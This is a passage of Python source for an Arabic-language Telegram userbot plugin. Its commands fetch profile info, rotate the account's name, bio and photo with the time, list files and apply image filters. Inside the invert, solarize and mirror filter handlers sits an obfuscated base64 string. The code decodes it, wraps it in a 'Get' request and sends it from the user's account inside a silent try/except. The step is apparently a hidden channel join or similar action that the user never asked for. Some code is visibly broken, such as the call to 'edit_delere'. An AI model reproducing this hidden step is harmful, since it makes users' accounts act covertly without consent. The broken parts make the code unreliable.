        except FloodWaitError as ex:
            LOGS.warning(str(ex))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(Config.CHANGE_TIME)
        AUTOBIOSTART = gvarstatus(f"{OR_AUTOBIO}") == "true"


async def fetch_info(replied_user, event):
    FullUser = (await event.client(GetFullUserRequest(replied_user.id))).full_user
    replied_user_profile_photos = await event.client(        GetUserPhotosRequest(user_id=replied_user.id, offset=42, max_id=0, limit=80)    )
    replied_user_profile_photos_count = "لاتوجد صوره"
    dc_id = "لايوجد ايدي"
    try:
        replied_user_profile_photos_count = replied_user_profile_photos.count
        dc_id = replied_user.photo.dc_id
    except AttributeError:
        pass
    user_id = replied_user.id
    first_name = replied_user.first_name
    last_name = replied_user.user.last_name
    full_name = FullUser.private_forward_name
    common_chat = FullUser.common_chats_count
    username = replied_user.username
    user_bio = FullUser.about
    is_bot = replied_user.bot
    restricted = replied_user.restricted
    verified = replied_user.verified
    photo = await event.client.download_profile_photo(        user_id,        Config.TMP_DOWNLOAD_DIRECTORY + str(user_id) + ".jpg",        download_big=True,    )
    first_name = (        first_name.replace("\u2060", "")        if first_name        else ("ليس لديه اسم")    )
    last_name = (        last_name.replace("\u2060", "")        if last_name        else (" ")    )
    full_name = full_name or first_name
    username = "@{}".format(username) if username else ("ليس لديه معرف")
    user_bio = "لايوجد نبذه" if not user_bio else user_bio
    caption = "<b>𓍹ⵧⵧⵧⵧⵧⵧⵧⵧ⁦⁦ⵧⵧⵧⵧⵧⵧⵧⵧ𓍻</b>\n"
    caption += f"<b>• ⚜️ | الاســم  :  </b> {first_name} {last_name}\n"
    caption += f"<b>• ⚜️ | الــمــ؏ــࢪف  : </b> {username}\n"
    caption += f"<b>• ⚜️ | الايــدي  :  </b> <code>{user_id}</code>\n"
    caption += f"<b>• ⚜️ | ؏ــدد صــوࢪ  : </b> {replied_user_profile_photos_count}\n"
    caption += f"<b>• ⚜️ | الـحـسـاب  :  </b> "
    caption += f' <a href="tg://user?id={user_id}">{first_name}{last_name}</a> \n'
    caption += "<b>𓍹ⵧⵧⵧⵧⵧⵧⵧⵧ⁦⁦ⵧⵧⵧⵧⵧⵧⵧⵧ𓍻</b>\n"
    return photo, caption




async def autoname_loop():
    AUTONAMESTART = gvarstatus(f"{OR_NAMEAUTO}") == "true"
    while AUTONAMESTART:
        FONT1 = time.strftime("%I:%M")
        number = "0123456789"

        for i in FONT1:
            if i in number:
                nfont = gvarstatus("FONTGRCH")  or "𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫𝟢"
                fn = nfont[number.index(i)]
                FONT1 = FONT1.replace(i, fn)
        name = f"{EMOJI_TELETHON} {FONT1} • "
        LOGS.info(name)
        try:
            await zahid(functions.account.UpdateProfileRequest(first_name=name))
        except FloodWaitError as ex:
            LOGS.warning(str(ex))
            await asyncio.sleep(ex.seconds)
        await asyncio.sleep(Config.CHANGE_TIME)
        AUTONAMESTART = gvarstatus(f"{OR_NAMEAUTO}") == "true"



@zahid.on(admin_cmd(pattern=f"{idee}(?:\s|$)([\s\S]*)"))
async def who(event):
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    replied_user, reason = await get_user_from_event(event)
    if not replied_user:
        return
    cat = await edit_or_reply(event, " جاري جلب معلومات الشخص ....")
    try:
        photo, caption = await fetch_info(replied_user, event)
    except AttributeError:
        return await edit_or_reply(cat, "تعذر جلب المعلومات")
    message_id_to_reply = await reply_id(event)
    try:
        await event.client.send_file(
            event.chat_id,
            photo,
            caption=caption,
            link_preview=False,
            force_document=False,
            reply_to=message_id_to_reply,
            parse_mode="html",
        )
        if not photo.startswith("http"):
            os.remove(photo)
        await cat.delete()
    except TypeError:
        await cat.edit(caption, parse_mode="html")
FONT_FILE_TO_USE = "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
TELEGRAPH_MEDIA_LINKS = [    "https://telegra.ph/file/e354ce72d5cc6a1d27c4d.jpg",    "https://telegra.ph/file/8f9ff3d743e6707a61489.jpg",    "https://telegra.ph/file/bfc97f4abc4bec6fe860d.jpg",    "https://telegra.ph/file/5ef0f060023600ec08c19.jpg",    "https://telegra.ph/file/a448465a3a8a251170f76.jpg",    "https://telegra.ph/file/eb0ac1557668a98a38cb6.jpg",    "https://telegra.ph/file/fdb3691a17a2c91fbe76c.jpg",    "https://telegra.ph/file/ccdf69ebf6cb85c52a25b.jpg",    "https://telegra.ph/file/2adffc55ac0c9733ecc7f.jpg",    "https://telegra.ph/file/faca3b435da33f2f156f1.jpg",    "https://telegra.ph/file/93d0a48c31e16f036f0e8.jpg",    "https://telegra.ph/file/9ed89dc742b172a779312.jpg",    "https://telegra.ph/file/0b4c19a19fb834d922d66.jpg",    "https://telegra.ph/file/a95a0deb86f642129b067.jpg",    "https://telegra.ph/file/c4c3d8b5cfc3cc5040833.jpg",    "https://telegra.ph/file/1e1a1b52b9a313e066a04.jpg",    "https://telegra.ph/file/a582950a8a259efdcbbc0.jpg",    "https://telegra.ph/file/9c3a784d45790b193ca36.jpg",    "https://telegra.ph/file/6aa74b17ae4e7dc46116f.jpg",    "https://telegra.ph/file/e63cf624d1b68a5c819b6.jpg",    "https://telegra.ph/file/7e420ad5995952ba1c262.jpg",    "https://telegra.ph/file/c7a4dc3d2a9a422c19723.jpg",    "https://telegra.ph/file/163c7eba56fd2e8c266e4.jpg",    "https://telegra.ph/file/5c87b63ae326b5c3cd713.jpg",    "https://telegra.ph/file/344ca22b35868c0a7661d.jpg",    "https://telegra.ph/file/a0ef3e56f558f04a876aa.jpg",    "https://telegra.ph/file/217b997ad9b5af8b269d0.jpg",    "https://telegra.ph/file/b3595f99b221c56a5679b.jpg",    "https://telegra.ph/file/aba7f4b4485c5aae53c52.jpg",    "https://telegra.ph/file/209ca51dba6c0f1fba85f.jpg",    "https://telegra.ph/file/2a0505ee2630bd6d7acca.jpg",    "https://telegra.ph/file/d193d4191012f4aafd4d2.jpg",    "https://telegra.ph/file/47e2d151984bd54a5d947.jpg",    "https://telegra.ph/file/2a6c735b47db947b44599.jpg",    "https://telegra.ph/file/7567774412fb76ceba95c.jpg",    "https://telegra.ph/file/6dd8b0edec92b24985e13.jpg",    "https://telegra.ph/file/dcf5e16cc344f1c030469.jpg",    "https://telegra.ph/file/0718be0bd52a2eb7e36aa.jpg",    "https://telegra.ph/file/0d7fcb82603b5db683890.jpg",    "https://telegra.ph/file/44595caa95717f4db4788.jpg",    "https://telegra.ph/file/f3a063d884d0dcde437e3.jpg",    "https://telegra.ph/file/733425275da19cbed0822.jpg",    "https://telegra.ph/file/aff5223e1aa29f212a46a.jpg",    "https://telegra.ph/file/45ccfa3ef878bea9cfc02.jpg",    "https://telegra.ph/file/a38aa50d009835177ac16.jpg",    "https://telegra.ph/file/53e25b1b06f411ec051f0.jpg",    "https://telegra.ph/file/96e801400487d0a120715.jpg",    "https://telegra.ph/file/6ae8e799f2acc837e27eb.jpg",    "https://telegra.ph/file/265ff1cebbb7042bfb5a7.jpg",    "https://telegra.ph/file/4c8c9cd0751eab99600c9.jpg",    "https://telegra.ph/file/1c6a5cd6d82f92c646c0f.jpg",    "https://telegra.ph/file/2c1056c91c8f37fea838a.jpg",    "https://telegra.ph/file/f140c121d03dfcaf4e951.jpg",    "https://telegra.ph/file/39f7b5d1d7a3487f6ba69.jpg",]
@zahid.on(admin_cmd(pattern="رابطه(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if custom:
        return await edit_or_reply(mention, f"⨳ | [{custom}](tg://user?id={user.id})")
    tag = user.first_name.replace("\u2060", "") if user.first_name else user.username
    await edit_or_reply(mention, f"⨳ | [{tag}](tg://user?id={user.id})")
@zahid.on(admin_cmd(pattern="اسمه(?:\s|$)([\s\S]*)"))
async def permalink(mention):
    user, custom = await get_user_from_event(mention)
    if not user:
        return
    if custom:
        return await edit_or_reply(mention, f"⨳ | {custom} ")
    ll5 = user.first_name.replace("\u2060", "") if user.first_name else (" ")
    kno = user.last_name.replace("\u2060", "") if user.last_name else (" ")
    await edit_or_reply(mention, f"⨳  {ll5} {kno}")  
@zahid.on(admin_cmd(pattern="صورته(?:\s|$)([\s\S]*)"))
async def potocmd(event):
    uid = "".join(event.raw_text.split(maxsplit=1)[1:])
    user = await event.get_reply_message()
    chat = event.input_chat
    if user:
        photos = await event.client.get_profile_photos(user.sender)
        u = True
    else:
        photos = await event.client.get_profile_photos(chat)
        u = False
    if uid.strip() == "":
        uid = 1
        if int(uid) > (len(photos)):
            return await edit_delete(                event, "**🝳 ⦙   لم يتم العثور على صورة لهذا  الشخص 🏞**"            )
        send_photos = await event.client.download_media(photos[uid - 1])
        await event.client.send_file(event.chat_id, send_photos)
    elif uid.strip() == "جميعها":
        if len(photos) > 0:
            await event.client.send_file(event.chat_id, photos)
        else:
            try:
                if u:
                    photo = await event.client.download_profile_photo(user.sender)
                else:
                    photo = await event.client.download_profile_photo(event.input_chat)
                await event.client.send_file(event.chat_id, photo)
            except Exception:
                return await edit_delete(event, "**🝳 ⦙   هذا المستخدم ليس لديه صور لتظهر لك  🙅🏼  **")
    else:
        try:
            uid = int(uid)
            if uid <= 0:
                await edit_or_reply(                    event, "**🝳 ⦙   الرقم غير صحيح - اختر رقم صوره موجود فعليا ⁉️**"                )
                return
        except BaseException:
            await edit_or_reply(event, "**🝳 ⦙   هناك خطا  ⁉️**")
            return
        if int(uid) > (len(photos)):
            return await edit_delere(                event, "**🝳 ⦙   لم يتم العثور على صورة لهذا  الشخص 🏞**"            )

        send_photos = await event.client.download_media(photos[uid - 1])
        await event.client.send_file(event.chat_id, send_photos)
    await event.delete()  
@zahid.on(admin_cmd(pattern=f"{OR_FOTOAUTO}(?: |$)(.*)"))
async def _(event):
    downloader = SmartDL(digitalpfp, digitalpic_path, progress_bar=False)
    downloader.start(blocking=False)
    while not downloader.isFinished():
        pass
    if gvarstatus(f"{OR_FOTOAUTO}") is not None and gvarstatus(f"{OR_FOTOAUTO}") == "true":
        return await edit_delete(event, f"**🝳 ⦙  صوره وقتية مفعّلـة بالفعـل !**")
    addgvar(f"{OR_FOTOAUTO}", True)
    await edit_delete(event, f"**🝳 ⦙  تـمّ بـدأ الصـورة الديجيتـال بواسطـة المستخـدم ✓**")
    await digitalpicloop()
@zahid.on(admin_cmd(pattern="الملفات ?(.*)"))
async def _(e):
    files = e.pattern_match.group(1)
    if not files:
        files = "*"
    elif files.endswith("/"):
        files = files + "*"
    elif "*" not in files:
        files = files + "/*"
    files = glob.glob(files)
    if not files:
        return await eor(e, "الدليل فارغ أو غير صحيح", time=5)
    pyfiles = []
    jsons = []
    vdos = []
    audios = []
    pics = []
    others = []
    otherfiles = []
    folders = []
    text = []
    apk = []
    exe = []
    zip_ = []
    book = []
    for file in sorted(files):
        if os.path.isdir(file):
            folders.append("📂 " + str(file))
        elif str(file).endswith(".py"):
            pyfiles.append("🐍 " + str(file))
        elif str(file).endswith(".json"):
            jsons.append("🔮 " + str(file))
        elif str(file).endswith((".mkv", ".mp4", ".avi", ".gif", "webm")):
            vdos.append("🎥 " + str(file))
        elif str(file).endswith((".mp3", ".ogg", ".m4a", ".opus")):
            audios.append("🔊 " + str(file))
        elif str(file).endswith((".jpg", ".jpeg", ".png", ".webp")):
            pics.append("🖼 " + str(file))
        elif str(file).endswith((".txt", ".text", ".log")):
            text.append("📄 " + str(file))
        elif str(file).endswith((".apk", ".xapk")):
            apk.append("📲 " + str(file))
        elif str(file).endswith(".exe"):
            exe.append("⚙ " + str(file))
        elif str(file).endswith((".zip", ".rar")):
            zip_.append("🗜 " + str(file))
        elif str(file).endswith((".pdf", ".epub")):
            book.append("📗 " + str(file))
        elif "." in str(file)[1:]:
            others.append("🏷 " + str(file))
        else:
            otherfiles.append("📒 " + str(file))
    omk = [        *sorted(folders),        *sorted(pyfiles),        *sorted(jsons),        *sorted(zip_),        *sorted(vdos),        *sorted(pics),        *sorted(audios),        *sorted(apk),        *sorted(exe),        *sorted(book),        *sorted(text),        *sorted(others),        *sorted(otherfiles),    ]
    text = ""
    fls, fos = 0, 0
    flc, foc = 0, 0
    for i in omk:
        try:
            emoji = i.split()[0]
            name = i.split(maxsplit=1)[1]
            nam = name.split("/")[-1]
            if os.path.isdir(name):
                size = 0
                for path, dirs, files in os.walk(name):
                    for f in files:
                        fp = os.path.join(path, f)
                        size += os.path.getsize(fp)
                if hb(size):
                    text += emoji + f" `{nam}`" + "  `" + hb(size) + "`\n"
                    fos += size
                else:
                    text += emoji + f" `{nam}`" + "\n"
                foc += 1
            else:
                if hb(int(os.path.getsize(name))):
                    text += (                        emoji                        + f" `{nam}`"                        + "  `"                        + hb(int(os.path.getsize(name)))                        + "`\n"                    )
                    fls += int(os.path.getsize(name))
                else:
                    text += emoji + f" `{nam}`" + "\n"
                flc += 1
        except BaseException:
            pass
    tfos, tfls, ttol = hb(fos), hb(fls), hb(fos + fls)
    if not hb(fos):
        tfos = "0 B"
    if not hb(fls):
        tfls = "0 B"
    if not hb(fos + fls):
        ttol = "0 B"
    text += f"\n\nالمجلدات :  `{foc}` :   `{tfos}`\nعدد الملفات :       `{flc}` :   `{tfls}`\nالمجموع :       `{flc+foc}` :   `{ttol}`"
    try:
        await eor(e, text)
    except MessageTooLongError:
        with io.BytesIO(str.encode(text)) as out_file:
            out_file.name = "output.txt"
            await e.reply(                f"`{e.text}`", file=out_file, thumb=None ) 
        await e.delete()
def text_set(text):
    lines = []
    if len(text) <= 55:
        lines.append(text)
    else:
        all_lines = text.split("\n")
        for line in all_lines:
            if len(line) <= 55:
                lines.append(line)
            else:
                k = int(len(line) / 55)
                for z in range(1, k + 2):
                    lines.append(line[((z - 1) * 55) : (z * 55)])
    return lines[:25]
    

@zahid.on(admin_cmd(pattern="كتابه ?(.*)"))
async def writer(e):
    if e.reply_to:
        reply = await e.get_reply_message()
        text = reply.message
    elif e.pattern_match.group(1):
        text = e.text.split(maxsplit=1)[1]
    else:
        return await e.edit("Privode Some Text🥲")
    img = Image.open("SQL/template.jpg")
    draw = ImageDraw.Draw(img)
    font = ImageFont.truetype("SQL/assfont.ttf", 30)
    x, y = 150, 140
    lines = text_set(text)
    line_height = font.getsize("hg")[1]
    for line in lines:
        draw.text((x, y), line, fill=(1, 22, 55), font=font)
        y = y + line_height - 5
    file = "zahid_Write.jpg"
    img.save(file)
    await e.reply(file=file)
    os.remove(file)
    await e.delete()
@zahid.on(admin_cmd(pattern="عد الردود ?(.*)"))
async def _(event):
    await eor(event, "جاري العد ...")
    count = -1
    message = event.message
    while message:
        reply = await message.get_reply_message()
        if reply is None:
            await borg(                SaveDraftRequest(                    await event.get_input_chat(), "", reply_to_msg_id=message.id                )            )
        message = reply
        count += 1
    await eor(event, f"عدد الردود على هذا الرساله : {count}")

@zahid.on(admin_cmd(pattern="زاجل ?(.*)"))
async def pmto(event):
    a = event.pattern_match.group(1)
    b = a.split(" ")
    chat_id = b[0]
    try:
        chat_id = int(chat_id)
    except BaseException:
        pass
    msg = ""
    for i in b[1:]:
        msg += i + " "
    if msg == "":
        return
    try:
        await borg.send_message(chat_id, msg)
        await event.edit("تم الارسال !🤗")
    except BaseException:
        await event.edit("هناك خطا .")
@zahid.on(admin_cmd(pattern=f"{OR_NAMEAUTO}(?: |$)(.*)"))
async def _(event):
    if gvarstatus(f"{OR_NAMEAUTO}") is not None and gvarstatus(f"{OR_NAMEAUTO}") == "true":
        return await edit_delete(event, f"**🝳 ⦙  الإسـم الوقتـي قيـد التشغيـل بالفعـل !**")
    addgvar(f"{OR_NAMEAUTO}", True)
    await edit_delete(event, "**🝳 ⦙  تـمّ بـدأ الإسـم الوقتـي بواسطـة المستخـدم ✓**")
    await autoname_loop()
@zahid.on(admin_cmd(pattern=f"{OR_AUTOBIO}(?: |$)(.*)"))
async def _(event):
    "🝳 ⦙  يحـدّث البايـو مع الوقـت 💡"
    if gvarstatus(f"{OR_AUTOBIO}") is not None and gvarstatus(f"{OR_AUTOBIO}") == "true":
        return await edit_delete(event, f"**🝳 ⦙  البايـو الوقتـي قيـد التشغيـل بالفعـل !**")
    addgvar(f"{OR_AUTOBIO}", True)
    await edit_delete(event, "**🝳 ⦙  تـمّ بـدأ البايـو الوقتـي بواسطـة المستخـدم ✓**")
    await autobio_loop()
@zahid.iq_cmd(pattern="سمول(?: |$)(.*)")
async def ultiny(event):
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await event.edit("قم بالرد على صوره او ملصق لتصغيره")
        return
    xx = await event.edit("جاري التصغير ...")
    ik = await event.client.download_media(reply)
    im1 = Image.open("SQL/blank.png")
    if ik.endswith(".tgs"):
        await event.client.download_media(reply, "ult.tgs")
        await bash("lottie_convert.py ult.tgs json.json")
        with open("json.json") as json:
            jsn = json.read()
        jsn = jsn.replace("512", "2000")
        open("json.json", "w").write(jsn)
        await bash("lottie_convert.py json.json ult.tgs")
        file = "ult.tgs"
        os.remove("json.json")
    elif ik.endswith((".gif", ".mp4")):
        iik = cv2.VideoCapture(ik)
        dani, busy = iik.read()
        cv2.imwrite("i.png", busy)
        fil = "i.png"
        im = Image.open(fil)
        z, d = im.size
        if z == d:
            xxx, yyy = 200, 200
        else:
            t = z + d
            a = z / t
            b = d / t
            aa = (a * 100) - 50
            bb = (b * 100) - 50
            xxx = 200 + 5 * aa
            yyy = 200 + 5 * bb
        k = im.resize((int(xxx), int(yyy)))
        k.save("k.png", format="PNG", optimize=True)
        im2 = Image.open("k.png")
        back_im = im1.copy()
        back_im.paste(im2, (150, 0))
        back_im.save("o.webp", "WEBP", quality=95)
        file = "o.webp"
        os.remove(fil)
        os.remove("k.png")
    else:
        im = Image.open(ik)
        z, d = im.size
        if z == d:
            xxx, yyy = 200, 200
        else:
            t = z + d
            a = z / t
            b = d / t
            aa = (a * 100) - 50
            bb = (b * 100) - 50
            xxx = 200 + 5 * aa
            yyy = 200 + 5 * bb
        k = im.resize((int(xxx), int(yyy)))
        k.save("k.png", format="PNG", optimize=True)
        im2 = Image.open("k.png")
        back_im = im1.copy()
        back_im.paste(im2, (150, 0))
        back_im.save("o.webp", "WEBP", quality=95)
        file = "o.webp"
        os.remove("k.png")
    await event.client.send_file(event.chat_id, file, reply_to=event.reply_to_msg_id)
    await xx.delete()
    os.remove(file)
    os.remove(ik)
@zahid.on(events.NewMessage(outgoing=True, pattern="^.ارسل ?(.*)"))

async def remoteaccess(event):

    p = event.pattern_match.group(1)
    m = p.split(" ")

    chat_id = m[0]
    try:
        chat_id = int(chat_id)
    except BaseException:

        pass

    msg = ""
    mssg = await event.get_reply_message()
    if event.reply_to_msg_id:
        await event.client.send_message(chat_id, mssg)
        await event.edit("تم الارسال الرسالة الى الرابط الذي وضعتة")
    for i in m[1:]:
        msg += i + " "
    if msg == "":
        return
    try:
        await event.client.send_message(chat_id, msg)
        await event.edit("تم ارسال الرساله الى الرابط الذي وضعتة")
    except BaseException:
        await event.edit("** عذرا هذا ليست مجموعة **")
async def GrChiq_loop():
    ag = getGrChAuto()
    AUTONAMESTAR = ag != None
    while AUTONAMESTAR:
        time.strftime("%d-%m-%y")
        HM = time.strftime("%I:%M")
        for normal in HM:
            if normal in FONTGRCH1:
                namefont = FONTGRCH2[FONTGRCH1.index(normal)]
                HM = HM.replace(normal, namefont)
        name = f"{AUTOGRCH} {HM}"
        try:
            await zahid(functions.channels.EditTitleRequest(channel=await zahid.get_entity(int(ag)), title=name))
        except ChatAdminRequiredError:
            await zahid.tgbot.send_message(BOTLOG_CHATID, "**يجب ان يكون لديك صلاحية تغيير اسم الكروب لتفعيل وقتي الكروب•**")
        except ChannelInvalidError:
            return
        except FloodWaitError:
            LOGS.warning("FloodWaitError! خطأ حظر مؤقت من التيليجرام")
        await asyncio.sleep(Config.CHANGE_TIME)
        AUTONAMESTAR = getGrChAuto() != None
@zahid.on(admin_cmd(pattern="عكس الالوان$", outgoing=True))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة...")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    pass

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان!"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط - عكس الألوان ..."        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود .. ")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان هذا الفيديو!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "تحليل هذه الوسائط - عكس ألوان هذه الصورة!"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if kraken else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
@zahid.on(admin_cmd(outgoing=True, pattern="فلتر احمر$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة ...")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    pass

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط - فلتر احمر !"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود ...")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود ... ")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "القالب غير موجود 🧐 !"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if kraken else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@zahid.on(admin_cmd(outgoing=True, pattern="يمين الصوره$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    pass

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("الوسائط المدعومة غير موجودة")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if kraken else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

zahid.loop.create_task(digitalpicloop())
zahid.loop.create_task(autoname_loop())
zahid.loop.create_task(autobio_loop())
zahid.loop.create_task(GrChiq_loop())        

